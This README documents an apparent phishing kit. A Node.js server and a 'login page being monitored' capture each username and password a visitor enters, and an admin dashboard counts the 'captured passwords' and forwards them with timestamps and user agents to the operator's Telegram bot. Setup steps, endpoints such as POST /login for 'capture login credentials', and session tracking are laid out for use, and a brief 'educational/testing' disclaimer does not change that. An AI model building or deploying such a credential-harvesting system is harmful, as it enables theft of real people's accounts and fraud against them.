# Admin Panel - Live Monitoring Dashboard

A comprehensive admin panel with real-time monitoring, login tracking, and Telegram notifications.

## Features

### � Secure Access
- **Password Protected**: Admin panel requires authentication
- **Session Management**: Auto-expires after 24 hours
- **Logout Function**: Manually clear session and disconnect
- **Visual Feedback**: Password visibility toggle for convenience

### �🔴 Live Monitoring
- **Real-time Updates**: WebSocket connection for instant updates
- **Daily Traffic**: Total visits and unique visitors
- **Live User Count**: See how many users are currently on the site
- **Session Tracking**: Monitor active user sessions with duration and page counts

### 🔐 Security Monitoring
- **Login Captures**: Track all username/password attempts
- **User Activity**: Monitor page views and navigation
- **Exit Tracking**: Know when users leave the site
- **Real-time Alerts**: Get notifications for captured credentials

### 📱 Telegram Integration
- Instant notifications when credentials are captured
- Detailed information including username, password, timestamp, and user agent
- Continues to work alongside the admin panel

### 🎨 Customizable Themes
- **Dark** (Default): Black background with red/blue/green accents
- **Matrix**: Classic green-on-black hacker aesthetic
- **Ocean**: Cool blue and cyan tones
- **Fire**: Hot red, orange, and yellow colors
- **Neon**: Vibrant pink, cyan, and purple
- **Ice**: Crisp ice blue and white

Theme preference is saved and persists across sessions.

## Setup Instructions

### 1. Install Dependencies
```bash
npm install
```

This will install:
- `dotenv` - For environment variables
- `ws` - WebSocket library for real-time communications

### 2. Configure Telegram Bot (Optional)
Create a `.env` file in the project root:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

To get these values:
1. Create a bot with [@BotFather](https://t.me/BotFather) on Telegram
2. Get your chat ID from [@userinfobot](https://t.me/userinfobot)

### 3. Start the Servers

#### Option A: Using the batch file (Windows)
```bash
start-servers.bat
```

#### Option B: Manual start
```bash
# Terminal 1 - Main server
node server.js

# Terminal 2 - Telegram notification server
node telegram-notify.js
```

#### Option C: Using npm
```bash
npm start
```

## Access Points

- **Main Site**: http://localhost:3000
- **Admin Panel**: http://localhost:3000/admin *(requires password)*
- **Login Page**: http://localhost:3000/index.html

## Admin Panel Login

The admin panel is protected by password authentication.

**Default Password**: `admin123`

### Security Features
- Password required before accessing dashboard
- Session expires after 24 hours
- Authentication state stored locally
- Logout button to clear session
- Password visibility toggle

### Changing the Admin Password
Edit [admin.js](admin.js#L4) and change the `ADMIN_PASSWORD` constant:

```javascript
const ADMIN_PASSWORD = 'your_new_password_here';
```

For production use, implement server-side authentication with proper password hashing.

## Admin Panel Overview

### Dashboard Stats
The top of the admin panel shows 6 key metrics:
1. **Total Daily Visits** - All page views today
2. **Unique Visitors** - Distinct users today
3. **Live Users Now** - Currently active users
4. **Login Attempts** - Total login tries today
5. **Captured Passwords** - Successfully captured credentials
6. **Last Activity** - Timestamp of most recent activity

### Tabs

#### 🔑 Captured Logins
- View all captured username/password combinations
- Shows timestamp, credentials, client ID, and user agent
- New entries are highlighted
- Auto-updates in real-time

#### 👤 Active Sessions
- See all currently active user sessions
- First seen and last seen times
- Session duration
- Number of pages viewed
- Current page location

#### 📝 Live Activity Feed
- Real-time feed of all site activity
- Page views, logins, and user departures
- Color-coded by event type
- Clear feed option to reset

### Features

#### Connection Status
Top-right indicator shows WebSocket connection status:
- 🟢 **Connected** - Receiving live updates
- 🟡 **Connecting** - Attempting to connect
- 🔴 **Disconnected** - No connection (will auto-reconnect)

#### Theme Selector
Click the "🎨 Theme" button to:
- Choose from 6 color schemes
- Preview themes before applying
- Automatically saves your preference

#### Refresh Button
Manually refresh dashboard data if needed (though it updates automatically via WebSocket)

## How It Works

### Client-Side Tracking
The `analytics.js` script automatically tracks:
- Page views
- Session duration (via heartbeat every 10 seconds)
- JavaScript errors
- Page visibility changes
- When users leave the site

### Server-Side Processing
The `server.js` handles:
- Receiving tracking events
- Storing session and login data
- Broadcasting updates to admin dashboard via WebSocket
- Serving static files
- Providing REST API for data retrieval

### Real-Time Communication
- WebSocket connection provides instant updates
- No page refresh needed
- Auto-reconnects if connection drops
- Fallback to HTTP polling for initial data

### Telegram Notifications
The `telegram-notify.js` server:
- Runs independently on port 3001
- Receives notification requests
- Sends formatted messages to Telegram
- Includes login details and timestamps

## Security Notes

⚠️ **Important**: This is a monitoring tool for educational/testing purposes.

- ✅ Password protection on admin panel (default: `admin123`)
- ✅ Session expiration after 24 hours
- ⚠️ Client-side authentication (for production, use server-side)
- ⚠️ Change the default password in admin.js
- All data is stored in memory (resets on server restart)
- For production, use a proper database
- Consider adding HTTPS and proper server-side authentication
- Hash passwords properly in production environments

## Troubleshooting

### WebSocket won't connect
- Make sure server.js is running
- Check that port 3000 is not blocked by firewall
- Try refreshing the admin page

### Telegram notifications not working
- Verify your `.env` file has correct credentials
- Check that telegram-notify.js is running on port 3001
- Test bot token with Telegram API directly

### No data showing
- Ensure you're visiting the login page first (http://localhost:3000/index.html)
- Check browser console for JavaScript errors
- Verify analytics.js is loading correctly

### Styling issues
- Clear browser cache
- Check that admin.css is loading
- Try a different theme

## File Structure

```
📁 Bigtimemoney - copy/
├── 📄 server.js              - Main server with tracking & WebSocket
├── 📄 telegram-notify.js     - Telegram notification server
├── 📄 admin.html             - Admin panel HTML
├── 📄 admin.css              - Admin panel styles (with themes)
├── 📄 admin.js               - Admin panel JavaScript
├── 📄 analytics.js           - Client-side tracking script
├── 📄 index.html             - Login page being monitored
├── 📄 login.js               - Login page logic
├── 📄 login.css              - Login page styles
├── 📄 package.json           - Node.js dependencies
├── 📄 .env                   - Environment variables (create this)
└── 📄 start-servers.bat      - Windows startup script
```

## API Endpoints

### POST /track
Track analytics events
```json
{
  "type": "page_view",
  "clientId": "client_abc123",
  "path": "/login.html",
  "data": { ... }
}
```

### POST /login
Capture login credentials
```json
{
  "username": "user@example.com",
  "password": "secret123",
  "clientId": "client_abc123"
}
```

### POST /user-left
Track when user leaves
```json
{
  "clientId": "client_abc123"
}
```

### GET /admin/stats
Get current statistics and data
```json
{
  "stats": { ... },
  "recentLogins": [ ... ],
  "activeSessions": [ ... ]
}
```

## Customization

### Changing the Admin Password
Edit `admin.js` line 4:

```javascript
const ADMIN_PASSWORD = 'your_secure_password_here';
```

### Changing Session Expiry Time
Edit `admin.js` line 6:

```javascript
const AUTH_EXPIRY_HOURS = 24; // Change to desired hours
```

### Adding More Themes
Edit `admin.css` and add a new theme block:

```css
body[data-theme="mytheme"] {
  --bg-primary: #000000;
  --color-primary: #ff0000;
  /* ... more variables ... */
}
```

Then add the theme option to `admin.html` in the theme modal.

### Changing Tracking Intervals
Edit `analytics.js`:
```javascript
const HEARTBEAT_MS = 10000; // Change to desired milliseconds
```

### Enhancing Authentication (Production)
The current authentication is client-side. For production, add server-side verification:

**In server.js:**
```javascript
const ADMIN_PASSWORD_HASH = 'bcrypt_hash_here';

const checkAdminAuth = (req, res) => {
  const { password } = req.body;
  // Verify password with bcrypt
  if (!bcrypt.compareSync(password, ADMIN_PASSWORD_HASH)) {
    res.writeHead(401);
    res.end(JSON.stringify({ error: 'Unauthorized' }));
    return false;
  }
  return true;
};
```

Use JWT tokens for proper session management and HTTPS in production.

## Support

For issues or questions:
1. Check the browser console for errors
2. Verify all servers are running
3. Review server logs in terminal
4. Ensure all dependencies are installed

## License

Private use only.
